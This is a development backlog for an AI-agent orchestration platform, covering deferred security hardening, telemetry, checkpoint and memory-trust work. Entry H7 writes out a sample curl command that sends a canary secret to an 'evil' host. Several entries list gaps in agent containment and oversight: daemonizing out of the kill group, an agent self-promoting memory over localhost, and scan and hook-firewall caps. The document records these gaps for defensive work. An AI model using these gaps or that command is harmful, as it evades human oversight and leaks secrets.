# AgentOS — Out-of-Scope & Deferred Backlog

Collected from milestones M0–M8 (Plan v3 build, branch `m0-security-patch`). Two kinds of entry:

- **Kill-list / plan-scoped exclusions** — deliberately NOT built per the plan's kill list. Do not revisit without a decision.
- **Follow-ups & deferred hardening** — real work surfaced during implementation/verification, punted to a later milestone or a backlog. Each carries a severity and a suggested home.

Last updated: 2026-07-18 (backfill pass).

---

## 1. Kill-list exclusions (deliberate — per Plan v3 §6)

| Item | Milestone | Why excluded |
|---|---|---|
| `.agent-os/credentials.yml` | M0 | Secrets are never project files. Ever. |
| `better-sqlite3` + `drizzle-orm` | M1 | `node:sqlite` already in repo — WAL + FTS5 + loadExtension, no native build. |
| Hand-rolled sandbox | M3 | Select a sandbox (srt / Landlock), never build one. srt installed for claude, codex uses Landlock. |
| Tournament / N-way fan-out + promote-winner | M4 (future) | Multiplies the measured bottleneck (review) by N. v2 experiment only. |
| Mobile PWA + web-push + VAPID + Cloudflare Tunnel | M7 (future) | First-party + MIT native apps ship it better. |
| Signed skill marketplace | future | Native marketplace exists; verified marketplaces breached anyway. Use private hash-pinned deny-by-default catalog. |
| RBAC / multi-user / audit / trust scores | future | Microsoft Agent 365 GA. Ceded. |
| A2A signed Agent Cards | future | Premature protocol work. |
| Multi-provider routing engine | future | `fallbackModel` + OpenRouter exist. Keep only per-run model+cost measurement. |
| FastAPI / Python backend | (prior plan) | Repo is single Next.js app; second runtime fixes nothing. |
| Media / SEO / leads / outreach / video / music tabs | — | Frozen. Move to optional Capability Packs after core works. |

---

## 2. Deferred hardening — env / secret leakage

**H1 — `...process.env` spread in non-agent subprocesses — ✅ RESOLVED (H1 hotfix, 2026-07-21).**
Route-level sites fixed by R1 (7c2c314, spawnSubprocess minimal env). Residual lib sites
(`videoAuto.ts`, `notebooklmClient.ts`, `hermesPhone.ts` brew + cloudflared tunnel,
`claudeArtifacts.ts` netlify) migrated to `spawnSubprocess`/`agentEnv` with per-tool extras
(HOMEBREW_* flags, NETLIFY_AUTH_TOKEN passthrough, NOTEBOOKLM_*/AGENTIC_OS_NLM_* passthrough).
Guarded by `h1-env-leakage.test.ts` (no `...process.env` spread, no raw `spawn` import in H1 modules).

**H2 — `opendesign/control/route.ts` `exec(bash …)` — ✅ RESOLVED in R1 (7c2c314).**
Shell invocation removed; `spawnSubprocessSync` with array args + minimal env (PATH only).

**R1 — Runner chokepoint partial — ✅ RESOLVED (7c2c314).**
All `src/app`/`src/features` `child_process` imports migrated onto the runner; ESLint
`no-restricted-imports` rule live in `eslint.config.mjs` (§4.2 invariant enforced). Verified
2026-07-21: zero direct importers under app/features.

---

## 3. Deferred hardening — telemetry / observability

**H3 — OTLP receiver on :4318 is unauthenticated (LOW).**
Any local process can POST fake usage deltas or trigger a canary trip. Localhost-bind + single-user mitigate.
→ **Home: M8 hardening.**

**H4 — Cost double-count in `finishRun` (LOW, fails safe).**
`finishRun` adds stdout-parsed cost additively on top of OTLP deltas → possible cost over-report. Never under-counts, so budget trips early (safe). Reconcile when accuracy matters (M5 review surface displays cost).
→ **Home: M5.**

**H5 — M2.5 progress signals are regex-derived, not first-class events (LOW).**
`filesTouched`/`test-state` derived by regex on the raw event stream. Fine now; wire structured tool-result events when they exist.
→ **Home: M4/M5 (when structured events land).**

---

## 4. Deferred hardening — process / sandbox containment

**H6 — Grandchild `setsid()` escapes process-group SIGKILL (LOW, inherent).**
Group-SIGKILL reaps the child's process group; a grandchild that daemonizes into its own group survives. Standard best-effort ceiling. Real containment is the sandbox (srt/Landlock), which is why M3 is load-bearing.
→ **Home: accepted ceiling; sandbox is the mitigation.**

**H7 — Canary has no outbound-network tap (HIGH, inherent limit).**
Canary/secret is caught in stdout/stderr, OTLP body, and post-run workspace diff/artifact scan — but a raw socket the agent opens (`curl https://evil/?k=$CANARY`) that never logs the payload is invisible without a full egress proxy (out of scope). True silent network exfil is only stopped by a no-network sandbox policy.
→ **Home: sign-off must state this limit explicitly; egress proxy is a separate future milestone.**

---

## 5. Deferred hardening — cross-platform / environment

**H8 — No "declared artifacts" concept on runner RunOptions (LOW).**
M3.8's artifact scan reduced to a workspace scan (where a leak would land anyway). If artifact manifests are meant to exist, that's separate wiring.
→ **Home: M5 (artifact/evidence linking).**

**H9 — `loop/run` `findChrome()` macOS-only path — ✅ RESOLVED (424d2e6, 2026-07-21).**
`findChrome()` now searches all platform Playwright cache roots (linux/WSL `~/.cache/ms-playwright`, macOS, Windows `LOCALAPPDATA`), honors `PLAYWRIGHT_BROWSERS_PATH` first (ignoring the `0` hermetic sentinel), and matches the `.exe` binary variant. `chromeSearchBases()` exported; `h9-chrome-lookup.test.ts` pins the contract. renderCheck on WSL now finds the binary once `npx playwright install chromium-headless-shell` has run.

**H10 — DPAPI interop unverified end-to-end on this host (MEDIUM, blocking M3.4 sign-off).**
Broker assumes `/mnt/c/.../powershell.exe` is callable from WSL. If `[interop] enabled=false` in `/etc/wsl.conf`, DPAPI probe silently fails → falls to libsecret → if no D-Bus, refuses all secret storage (fail-safe, but broker unusable). Run one `storeSecret`/`loadSecret` round-trip on the target machine before declaring M3.4 done.
→ **Home: M3 sign-off checklist.**

**H11 — `kanbanSeo`/`hermesJarvis` pass `cwd: process.cwd()` (LOW).**
Server dir, not a per-run workspace. Satisfies `requireWorkspace` (absolute) but not ideal isolation.
→ **Home: later hardening.**

---

## 6. Deferred — test coverage

**H12 — M2 budget_limits agent/workspace scopes + prepareRun billing-throw path verified by inspection only (LOW).**
Only global scope is unit-tested. Per-scope logic correct by inspection.
→ **Home: M8 eval hardening.**

**H13 — Codex-imported history contributes zero token/cost (LOW).**
`worker.ts` import path emits only `completed` for codex history; no usage captured. Acceptable if historical JSONL lacks usage.
→ **Home: revisit if codex history cost matters.**

**H14 — Cumulative-vs-delta OTLP temporality is an unverified external contract (MEDIUM).**
Delta math assumes Claude Code exports cumulative counters (OTLP default; runner does not set delta preference). Real-CLI fixture captured (2.1.207) confirms current behavior; would break if Claude ships delta temporality.
→ **Home: M8 regression fixture.**

---

## 6b. M3 verification LOW findings (defense-in-depth)

**LOW-1 — Cross-process OTLP secret-value scan degrades to canary-only (LOW).**
`runSecretValues` map is populated in `prepareRun` and read by the OTLP receiver — but only same-process. Route-spawned agents (`spawnStream` in the Next.js process) leave the worker-process receiver without the runId → falls back to canary-only value matching. Mitigated: OTLP body never persisted (only byte length), `OTEL_LOG_TOOL_DETAILS` suppressed at source, canary always caught cross-process. In-process stdout/stderr redaction unaffected.
→ **Home: M8 hardening (or shared secret-value store if worker/next split persists).**

**LOW-2 — `scanWorkspaceForSecrets` caps are silent (LOW).**
Caps (2000 files / 20 hits / 1MB per file) and the `mtime<start` filter drop content with no telemetry. A secret in a >1MB file, beyond the 2000-file budget, or with a backdated mtime is missed by the artifact path with no signal (stdout/OTLP paths still apply). Emit a log/event when a cap truncates the scan.
→ **Home: M8.**

**LOW-3 — Config-firewall directory recursion caps at 200 entries (LOW).**
`configFirewall.ts:22 slice(0,200)` — a `.claude/hooks` dir with >200 files could hide the 201st from the baseline. Raise cap or hash a manifest of names+count so additions past 200 still trip.
→ **Home: M8.**

---

## 7. Tooling debt (blocks a clean CI)

**D1 — ESLint is non-functional (no TS parser).**
Codex-added `eslint.config.mjs` matches `**/*.ts,tsx` with default espree parser → 428 parse errors. `eslint-config-next` + `@eslint/eslintrc` installed but never wired. Blocks R1's `no-restricted-imports` rule from running. `config-protection` hook also guards the file.
→ **Home: standalone fix — wire `eslint-config-next` flat config (FlatCompat), then add R1 rule.**

---

## 8. M5 deferred findings — review surface & checkpoints

**Closure note.** M5 closed 2026-07-13; M6 core (git-ref checkpoints, worktree-first restore, retry/fork/restore verbs) pulled forward into M5 by user decision.

**M5-1 — `isWorkingTreeDirty` fails open when `git status` errors (`checkpoints.ts:44`) (LOW).**
Unreachable via UI (destructive path always sends force). Flip to fail-closed during M8 hardening.
→ **Home: M8 hardening.**

**M5-2 — No `--` separator before git positional args (sha/paths) in `checkpoints.ts` (LOW).**
Defense-in-depth; values are DB-sourced today.
→ **Home: M8 hardening.**

**M5-3 — `hashAction` normalization is shallow (LOW, fails safe).**
Arrays sorted but not deduped; command hashed as an opaque string (whitespace variants hash differently). Fail-safe: over-prompts, never under-authorizes.
→ **Home: backlog.**

**M5-4 — `listTriage` recency window (20) can hide an old pending-approval run (LOW).**
Push the pending filter into the SQL `WHERE` when run volume grows.
→ **Home: backlog (when run volume grows).**

**M5-5 — `/runs` triage index has no nav link anywhere (LOW).**
Reachable only by direct URL. Add an entry when touching the shell UI.
→ **Home: next shell-UI change.**

**M5-6 — Review page doesn't surface `parent_run_id` lineage / checkpoint list for retried-forked children (LOW).**
Nice-to-have for triage.
→ **Home: backlog.**

**M5-7 — `consumeGrant` execution gate has no production caller yet (LOW).**
Executor wiring lands when action re-execution ships.
→ **Home: action re-execution milestone.**

---

## 9. M6 deferred findings — checkpoints / restore / workspace isolation (design pass, 2026-07-13)

**Closure note.** M6 closed 2026-07-13, all seven items verified PASS.

**M6-1 — Distinct claude-native checkpoint id deferred (LOW, per plan R2).**
Deferred per plan R2 ("record which checkpoint was used over implement"). `session_id` already captured as `external_run_id` and emitted as a `native_checkpoint` event. Revisit when the Claude Code changelog exposes a stable checkpoint id in stream-json.
→ **Home: revisit on Claude Code stream-json checkpoint-id support.**

**M6-2 — Ref pruning makes commits unreachable but AgentOS never forces `git gc` (LOW, deliberate).**
Reclamation left to git auto-gc; forcing gc in user repos is invasive.
→ **Home: accepted (git auto-gc).**

**M6-3 — `allocatePort` bind-then-release has a TOCTOU window (LOW).**
Acceptable for the single-worker loop. Add a DB port-lease table if concurrent workers land.
→ **Home: concurrent-worker milestone.**

**M6-4 — fs-mode checkpoints (non-git workspaces): 512MiB hard cap (LOW).**
Loud `checkpoint_unavailable`; ignore-set mirrors runner `SCAN_SKIP` — no partial silent snapshots. Larger workspaces stay uncheckpointable until a streaming/tar design is justified.
→ **Home: accepted ceiling; streaming/tar design if justified.**

**M6-5 — fs-checkpoint content hashes stored but not verified at restore time (LOW).**
Snapshot content hashes are recorded but not re-checked when a fs-mode checkpoint is restored. Add an integrity gate on `~/.agentic-os` snapshot reads.
→ **Home: M8 hardening.**

**M6-6 — `checkpointStorageSummary` spawns git per workspace on `/runs` GET (LOW).**
Disk-usage panel shells out to git for each workspace on every `/runs` GET. Cache or revalidate the boundary if the page gets hot.
→ **Home: backlog (if `/runs` gets hot).**

**M6-7 — `m6-runner-env` real-spawn test can flake under full concurrent vitest load (LOW).**
OS port/spawn timing, not product logic. Serialize the test or add an `allocatePort` retry if it recurs.
→ **Home: backlog (if it recurs).**

---

## 10. M7 deferred findings — memory with provenance (2026-07-15)

**Closure note.** M7 closed 2026-07-15 (commits `95d95f5` feature, `858147e` promote-path integrity fix). Trust-tier quarantine, FTS5 search, vault gate, promote/demote audit all verified. A background security review of `95d95f5` surfaced the promote-path double-promotion bug — fixed in `858147e`, not deferred. The items below are the residuals.

**M7-1 — FTS5 MATCH query-syntax robustness (LOW).**
User-supplied search strings are passed to FTS5 `MATCH` parameterized (no SQL injection), but FTS5 has its own query grammar (`OR`/`AND`/`NEAR`/quoted phrases/column filters). Unbalanced quotes or stray operators can raise a parse error rather than returning empty. Adversarial test (M8.8) confirms quarantine invariant holds and search never silently mixes trusted/quarantined, but a hardened path would wrap the FTS5 query in try/catch and fall back to a sanitized/substring search on parse failure.
→ **Home: M8+ search hardening / backlog.**

**M7-2 — Concurrent promotion race on the same record (LOW, single-user tolerable).**
Two simultaneous `POST /api/memory/promote` for one id can both succeed; SQLite has no row-level locking and the promote path is not wrapped in a transaction. The `858147e` fix made promotion single-path with vault-failure rollback, but does not serialize concurrent promotions. Acceptable under the localhost single-user threat model; revisit if concurrent writers land.
→ **Home: concurrent-worker milestone / transaction wrapping.**

**M7-3 — `/api/memory/stats` leaks quarantined-record counts by origin (LOW).**
The stats route exposes counts per origin without auth. Acceptable localhost-only; restrict to the caller's own records if multi-user is ever introduced.
→ **Home: accepted (localhost); revisit on multi-user.**

**M7-4 — Store-level actor validation is defense-in-depth, not the primary gate (LOW).**
`promoteMemory`/`demoteMemory` now reject `actor !== 'user'` (added in `858147e`), but the authoritative human-in-the-loop check remains route-level. There is no cryptographic/session proof that a `POST /api/memory/promote` originated from the human UI rather than a same-box agent hitting localhost — the invariant is "unauthenticated localhost, single trusted user." A per-session confirm token minted by the UI (or origin/CSRF check) would harden this if the threat model ever widens.
→ **Home: accepted ceiling (localhost single-user); revisit if trust model widens.**

---

## 11. M8 deferred findings — evals, hardening, release (2026-07-15)

**Closure note.** M8 Phase 1 (adversarial regression suite, 8 themes) and Phase 2 (eval harness, 90-case corpus, dashboard) built this session; CI matrix + standalone distribution landed. Adversarial suite found **zero** product vulns in M0–M7 — all invariants held. Items below are scoped-out follow-ups.

**M8-1 — MCP tool-description sanitizer — ✅ RESOLVED (MEDIUM pass, 2026-07-21).**
`sanitizeDescription()` in `hermesMcp.ts` strips HTML tags + C0/C1 control chars, collapses whitespace, caps at 400 chars (text-only neutralization — no entity-escaping, React JSX escapes at render). Applied at both untrusted read sites: `listCatalog()` CLI table slice and `loadManifest()` manifest description. `extractAuth()` now enforces `VALID_AUTH_TYPES` allowlist (`api_key`/`oauth`/`none`; invalid → undefined). M8.3 regression test un-skipped with real assertions.

**M8-2 — Live eval runner is a guarded stub (deferred by design).**
`evalRunner.ts` fixture mode is the CI-default deterministic baseline ($0, no network). Live mode is guarded on `AGENTOS_EVAL_LIVE=1` and throws a "not yet implemented" stub — the real live-agent orchestration call is not wired. Hybrid design was the approved decision; live path lands when the orchestration layer is ready.
→ **Home: live-eval milestone (needs orchestration wiring).**

**M8-3 — Corpus fixtures are synthetic (LOW).**
The 90 corpus cases use procedurally-varied fixture metrics, not recorded real runs. Once the live runner (M8-2) ships, capture real execution snapshots to replace the synthetic fixtures so the baseline reflects true model behavior.
→ **Home: follows M8-2 (fixture generation from live runs).**

**M8-4 — Eval dashboard has no pagination / export / trend-over-time (LOW).**
`/eval` renders per-case and per-category baseline with variance, but the per-case table is unpaginated (fine at 90, add pagination past ~100), has no CSV export, and shows a point-in-time baseline with no historical trend. Add when the corpus or run-history grows.
→ **Home: backlog (when corpus/run volume grows).**

**M8-5 — M8.15 exit gate CI observation — ✅ RESOLVED (2026-07-21, runs 29817508393/29817836767/29818017018).**
Real GitHub Actions matrix observed across three main pushes: **ubuntu green 56s–1m1s, macos green 1m15s–1m36s** on every run (cold-cache, typecheck + lint + R1.4 security lints + 349-test suite + eval). Well inside the <15 min exit-gate budget. Two CI-infra bugs found and fixed en route: windows pwsh could not parse the bash-array R1.4 step (fixed: job-level `defaults.run.shell: bash`, 424d2e6) and node.exe could not `require()` the bash-only `/tmp` eslint output path (fixed: workspace-relative file, ba79b2c).

**M8-6 — Windows native support — ⚖ DECIDED: WSL2 is the supported Windows path (2026-07-21, run 29818017018).**
With CI infra fixed, native `windows-latest` reaches the test suite: typecheck, lint, and both R1.4 security lints green — but **10 test failures, all in git/path-sensitive suites** (`m6-restore` ×1, `m6-checkpoints` ×3, `m5-diff-capture` ×4, `m3-security` ×2): the CRLF/worktree/path-separator class this item predicted. `node:sqlite` itself loads (suite runs). Per Plan v3 §M8, WSL2 ships as the supported Windows path; the job stays in the matrix as `continue-on-error` telemetry.
Residual (LOW, → windows-native milestone if ever prioritized): triage the 10 m3/m5/m6 failures for CRLF/path-sep assumptions.

**M8-7 — Repo-wide ESLint debt; CI lint step is non-blocking (D-series, LOW).**
The eslint flat-config globals gap (only React/JSX declared) was fixed this session so `console`/`process`/browser/vitest no longer false-positive as `no-undef`, and all files added M7/M8 are lint-clean. Residual real debt remains in pre-existing files (unused-vars, `explicit-any`, `require`-imports across `src/components/**`, `scripts/x.mjs`, `search/route.ts`, `x-api.test.ts`). The CI `lint` step is `continue-on-error: true` so the M8 matrix gates on typecheck/test/eval; a full burn-down is the ongoing D-series effort, not an M8 exit criterion.
→ **Home: D-series lint burn-down (continues past M8).**

---

## 12. R3 deferred findings — memory module consolidation & observations (2026-07-18)

**Closure note.** R3 closed 2026-07-18 (items R3.1–R3.6 complete, 306 tests passed / 1 skipped). Invariant guards added, promote-route vault-first pattern verified, vault removal by stable ID implemented, ID format standardized, jarvis-memory route migrated to memoryStore. R3 scoping analysis (`.workflow/scratch/r3-scoping.md` Section 6) identified 19 additional deferred observations; all verified as out-of-scope for R3 per consolidation strategy. Items below: 5 residual R3-completion findings + 19 broader schema/concurrency/audit observations, organized by theme.

### R3 Completion Findings

**R3-1 — jarvisMemory module can be deleted post-R3 (LOW).**
Module is still imported by r2-memory-provenance.test.ts for backward-compatibility testing. Could be fully deleted if the test is updated to use memoryStore directly. Current state: r2 test uses jarvisMemory.appendMemory/listResidentMemories/promoteMemory; route layer has migrated to memoryStore.
→ **Home: backlog (test-level cleanup, not urgent).**

**R3-2 — Vault file cleanup after mass removal (LOW).**
removeMemory() leaves empty blocks in vault files (removes only the id-marker line, preserves formatting/separators). Vault files can accumulate whitespace but remain valid markdown. Add a cleanup job if vault file bloat becomes observable.
→ **Home: backlog (if vault file growth observed).**

**R3-3 — Concurrent demote race (LOW, single-user tolerable).**
Two simultaneous `POST /api/memory/demote` for one id with concurrent vault removal are not serialized. SQLite `UPDATE` + vault-removal are separate operations. Acceptable under localhost single-user; revisit if concurrent writers land.
→ **Home: concurrent-worker milestone / transaction wrapping.**

**R3-4 — JSONL deprecation candidate (LOW).**
jarvisMemory still writes to `~/.agentic-os/jarvis-memory.jsonl` but no active consumers visible in routes (all moved to DB). Candidate for cleanup or user-data export if JSONL is considered a backup/audit trail.
→ **Home: backlog (data export / deprecation if confirmed dead).**

**R3-5 — Vault ID-marker format depends on URL-safe character safety (LOW).**
removeMemory() matches the substring `<!-- mem:ID -->` which assumes memory IDs contain no newlines or comment-breaking characters. Current ID format (mem_<ts>_<rand>, [0-9a-z_]) is safe. If ID format ever changes to include special chars, validate marker format or escape.
→ **Home: design-time check on ID format changes.**

### Data Integrity & Schema

**R3-O1 — Vault–DB divergence risk (LOW).**
Obsidian vault is human-facing and should be source-of-truth for accepted memories. No mechanism exists to sync or audit divergence (vault file deleted externally, DB corruption, replication lag). Mitigation: add vault integrity check on startup (verify each promoted memory has a vault entry).
→ **Home: R4+ memory hardening / audit layer.**

**R3-O2 — Tier usage unclear (LOW).**
Schema defines three tiers: `core`, `recall`, `archival`. All observed appends use `tier='recall'` (jarvisMemory) or pass as parameter (memoryStore). No code differentiates tier behavior; queries don't filter by tier. Decision: Is tier for future archival/compact policies, or dead schema? Clarify or remove.
→ **Home: backlog (spec clarification or schema cleanup).**

**R3-O3 — No memory lifecycle/archival (LOW).**
memory table has `created_at` but no `expires_at` or `archived_at`. memory_audit table grows forever. No retention policy visible. Define TTL; add archival strategy (e.g., move old memories to archival tier after N days, compact memory_audit monthly).
→ **Home: R4+ memory lifecycle design.**

**R3-O4 — Schema evolution hazard — ✅ RESOLVED (2026-07-21).**
Migration framework in `src/lib/memoryMigrations.ts`: inline TS migration list (deviation from the numbered-.sql-files suggestion — Turbopack bundles the server, runtime .sql reads are fragile) tracked via `PRAGMA user_version`. Baseline DDL is migration 1 (IF NOT EXISTS, so legacy v0 DBs adopt without data loss). Each migration applies in its own transaction with the version bump inside it (atomic schema+version); list validated contiguous-from-1; DB newer than code throws (no downgrade). `openDb()` runs it on every open (no-op at current version). 10 tests cover fresh init, legacy adoption, rollback, validation, future-version rejection, idempotency. Scope: memory.db only — kanban DB has no migration story (unchanged, LOW if ever needed).

**R3-O5 — FTS5 sync fragility (LOW).**
memory_fts virtual table kept in sync via triggers. If trigger fails or is disabled, FTS5 index diverges from memory table. Searches may return stale or miss recent entries. Mitigation: periodic `REBUILD memory_fts`; test trigger failure scenarios; add FTS5 consistency check in stats endpoint or startup.
→ **Home: R4+ search reliability hardening.**

### Concurrency & Race Conditions

**R3-O6 — No row-level locking (LOW, single-user tolerable).**
SQLite uses whole-DB write lock. If two routes call promoteMemory(id) simultaneously, both see initial state (promoted_by=NULL), both issue UPDATE, first wins. Audit records both. Data loss: second promotion silently overwrites first. Acceptable under localhost single-user; revisit for concurrent writers.
→ **Home: concurrent-worker milestone / transaction wrapping.**

**R3-O7 — Concurrent promote + delete race (LOW, single-user tolerable).**
Memory row deleted by one request; promote request tries demote rollback on non-existent row. demoteMemory silently succeeds (UPDATE affects 0 rows, no error). Memory stays promoted in DB (row gone). Orphaned audit entries. Mitigation: add EXISTS check in rollback; handle "row deleted" as explicit error.
→ **Home: concurrent-worker milestone / transaction wrapping.**

**R3-O8 — Resident context pagination — ✅ RESOLVED (MEDIUM pass, 2026-07-21).**
`getResidentContext()` paginated: `{limit, offset}` options, default limit 200, hard cap 1000, negative/NaN clamped in-store (SQLite `LIMIT -1` is unbounded — defense in depth, not route-only). New `getMemoryById()` gives promote route O(1) lookup unaffected by pagination. `GET /api/memory/resident` accepts validated `?limit=&offset=` (non-integer/negative → 400, oversize clamped). jarvisMemory.listResidentMemories already had `limit=50` default.
Residual (LOW, → concurrent-worker milestone): demote path does not explicitly 404 a missing row — `demoteMemory` UPDATE on absent id surfaces as 500, inconsistent with promote's 404 (verifier note, adjacent to R3-O7).

### Query & Search Performance

**R3-O9 — FTS5 ranking strategy opaque (LOW).**
searchMemory uses FTS5 MATCH but does not control ranking (implicit BM25). Score weighting, phrase boost, synonym support unknown. Spec §4.3 recommends FTS5 but doesn't specify ranking. If relevance degrades, unclear how to tune. Mitigation: document FTS5 configuration; add optional ranking override for future semantic search layer.
→ **Home: R4+ search tuning / semantic layer.**

**R3-O10 — Search does not respect trust tier (LOW).**
searchMemory splits results by trust level but does NOT prevent quarantined memories from being returned (if `includeQuarantined=true`). Routes can expose quarantined in search results. Mitigation: default `includeQuarantined=false` in all routes; audit routes that pass `true`; add ACL check (only return if user is promoter/admin).
→ **Home: backlog (audit + ACL hardening).**

### Invariant Enforcement

**R3-O11 — Human-origin demotion allowed (LOW).**
demoteMemory has no WHERE clause and will demote human-origin memories back to quarantined. Spec §4.3 INVARIANT implies human-origin is always trusted. Current code allows demotion, violating invariant. Severity: LOW (only relevant if human-origin is marked `promoted_by='user'`, which should never happen). Mitigation: add guard in demoteMemory to reject human-origin; test invariant violation.
→ **Home: R4 invariant enforcement pass.**

**R3-O12 — No explicit quarantine enforcement on JSONL load (LOW).**
Spec guarantees non-human memories start quarantined. addMemory enforces this (lines 128–132). But JSONL loading in jarvisMemory (lines 89–111) does not validate; backward-compat code treats missing trust as quarantined. If old JSONL corrupted or manually edited, quarantine invariant violated silently. Mitigation: add validation on DB load (query all non-human memories with trust='trusted' on startup, warn or auto-fix).
→ **Home: R4 quarantine invariant audit.**

### Vault Integration

**R3-O13 — vaultWriter module not analyzed (LOW).**
Promote route depends on vaultWriter.appendMemory working correctly. No code inspection done. Potential issues: vault file not writable, Obsidian closed, path traversal, encoding issues. Mitigation: trace vaultWriter in separate scoping pass; add defensive error handling in promote route.
→ **Home: R4 vault integration audit.**

**R3-O14 — No vault cleanup on memory delete (LOW).**
Memory rows can be deleted via direct DB access (or future admin endpoint). No code removes corresponding vault entries. Orphaned vault entries accumulate. Mitigation: add database trigger or explicit cleanup; make memory deletion cascade to vault removal or set tombstone flag instead of hard delete.
→ **Home: R4 memory deletion / vault lifecycle.**

**R3-O15 — Promotion without vault write is silent (LOW).**
Current promote route treats vault failure as hard error (returns 500). Spec (line 487) implies strict transactionality. If vault service flaky and promotion retried many times, inconsistency window grows. Decision: should promotion succeed with warning if vault temporarily unavailable (deferred write)? Or stay strict? Clarify spec intent; add observability (metrics on promote/vault-write success rate).
→ **Home: R4 spec clarification / observability.**

### Audit & Compliance

**R3-O16 — Audit trail not queryable for replay (LOW).**
memory_audit table records promote/demote actions. No code reconstructs memory history or replays audits. If malicious/erroneous promotion happens, no clear way to see "who promoted, when, from what state". Mitigation: add audit query endpoint (memory_audit filtered by memory_id, actor); document audit retention policy.
→ **Home: R4+ audit query / forensics layer.**

**R3-O17 — No immutability guarantee on promoted_by (LOW).**
promoted_by field can be updated in-place (if demote called). No versioning or history chain. If admin wants to trace promotion chain (A promoted, then demoted, then B promoted), it's lost. Mitigation: consider append-only audit model; add promoted_by_chain (JSON array) or immutable state machine (status: quarantined/promoted_by_user/demoted_to_quarantine).
→ **Home: R4+ immutable audit / state machine design.**

### Observability

**R3-O18 — Memory stats may be stale (LOW).**
memoryStats (lines 267–297) reads live counts. If large promotion/demotion batch in flight, counts inconsistent. No denormalized stats table. Mitigation: add materialized view or stats cache (updated on every action); document staleness guarantee.
→ **Home: R4 materialized stats / observability.**

**R3-O19 — No visibility into silent failures (LOW).**
jarvisMemory.promoteMemory (line 158) silently swallows vault write errors. No logging, metric, or way to know if promotion partially failed. Spec exit gate (line 487) requires visibility. Mitigation: add error logging with context (memory_id, origin, promoted_by); structured logging for observability tools.
→ **Home: R4+ structured logging / observability.**

---

## 13. X-API integration deferred items (Radar post, engagement, CLI)

**Closure note.** X-API integration is a user-requested feature (skill ecc:x-api, "1 2 and 3") noted in LEDGER-x-integration-archive.md lines 118–156 as future work, not in M0–M8 plan scope. All 11 items are deferred and pending design decisions (OAuth implementation strategy, credential broker handoff, UI idioms). Listed below for future prioritization.

(Formerly Section 14; renumbered after merging Sections 12 & 13 on 2026-07-18.)

**X1 — OAuth 1.0a HMAC-SHA1 signature generation (LOW).**
Hand-rolled implementation with node:crypto (no new dependencies). Covers write operations; bearer token for reads. Pure function, no side effects. Test vector: known-good OAuth signature against fixed payload.
→ **Home: X-series feature (future milestone).**

**X2 — Credential broker integration for X API (LOW).**
Resolve x_consumer_key / x_consumer_secret / x_access_token / x_access_token_secret / x_bearer_token via credentialBroker.resolve, with process.env fallback (X_CONSUMER_KEY etc.) for CLI. Token values never logged; error text passed through redactText. Verify no leakage in logs/responses.
→ **Home: X-series feature.**

**X3 — Rate limit handling (LOW).**
Read x-rate-limit-remaining and x-rate-limit-reset response headers. On 429: wait-until-reset once, retry once. Surface remaining count in return metadata. Never busy-loop. Test with mock rate-limit scenarios.
→ **Home: X-series feature.**

**X4 — Thread chunker (LOW).**
Split text into tweets: ≤280 chars per tweet (URLs weighted 23 chars), sentence-boundary preferred split, "(n/m)" suffix when multi-part. Pure function, unit-tested. Edge cases: long URLs, no sentence boundaries, exact 280-char boundary.
→ **Home: X-series feature.**

**X5 — POST /api/radar/x-post route (MEDIUM).**
Validates {text|thread, signalKey}; posts via xApi; appends posted ids+headline to ~/.agentic-os/x/posted.json; returns tweet URLs. User's UI click IS the approval — no automated pipeline may call this route (no kanbanSeo/goals wiring). Decision: append-only log or versioned artifact store?
→ **Home: X-series feature / Radar integration design.**

**X6 — RadarView "Post to X" UI button (LOW).**
"Post to X" button on signals with a draft; two-click confirm (existing idiom); success shows tweet link inline; disabled with tooltip when creds missing. UX consistency with Radar styling.
→ **Home: X-series feature / Radar UI.**

**X7 — GET /api/x/feed route (LOW).**
Mentions + public_metrics for posted ids; bearer auth; 5-min disk cache at ~/.agentic-os/x/feed.json; creds missing → {ok:false, setup:"..."} clear message, never crash the view. Error messaging + cache invalidation strategy.
→ **Home: X-series feature.**

**X8 — RadarView engagement section (LOW).**
Render /api/x/feed (mentions + per-post metrics), matching Radar styling. Design decision: embedded panel or separate tab? Real-time or cached?
→ **Home: X-series feature / Radar UI.**

**X9 — CLI source/scripts/x.mjs (LOW).**
Subcommands: post "text" / thread <file> / search "q" / mentions / metrics <id>. Broker with env fallback. Runnable as npm run x -- <cmd>. JSON to stdout; nonzero exit on failure. CLI error messages and output format.
→ **Home: X-series feature / CLI.**

**X10 — Test suite (LOW).**
Mock global fetch (no real network). Coverage: OAuth signature fixed known vector, chunker edges (280 boundary, URL weighting, passthrough), x-post route validation, feed cache behavior. Isolation + fixtures.
→ **Home: X-series feature / tests.**

**X11 — Exit gate (LOW).**
Lint 0 errors, full vitest green, tsc clean; no hardcoded tokens anywhere; nothing secret committed. CI matrix green.
→ **Home: X-series feature / exit gate.**

---

## Severity roll-up

| Severity | Items |
|---|---|
| HIGH | H7 (no egress tap — inherent) |
| MEDIUM | H10 (DPAPI unverified), H14 (OTLP temporality), X5 (radar x-post route) |
| Resolved | R1 (7c2c314), H2 (7c2c314), H1 (2026-07-21 hotfix), M8-1 (2026-07-21 MEDIUM pass), R3-O8 (2026-07-21 MEDIUM pass), H9 (424d2e6), M8-5 (CI matrix observed 2026-07-21), M8-6 (decided: WSL2 supported path), R3-O4 (2026-07-21 migration framework) |
| LOW | H3, H4, H5, H6, H8, H11, H12, H13, M5-1..M5-7, M6-1..M6-7, M7-1..M7-4, M8-3, M8-4, M8-7, R3-1..R3-5, R3-O1..R3-O3, R3-O5..R3-O7, R3-O9..R3-O19, X1..X4, X6..X11 |
| Deferred by design | M8-2 (live eval runner — hybrid decision) |
| Tooling | D1 (ESLint TS parser — resolved via a26f800 + M8.18 globals fix; residual D-series lint-debt burn-down ongoing) |

Nothing here blocks M0–M8 or R3 exit gates (all verified independently). These are the accumulated "noticed but not in this milestone's scope" items, homed to the milestone or backlog where they belong. M8's own exit gate (M8-5, M8-6) requires a real multi-OS CI run to sign off.
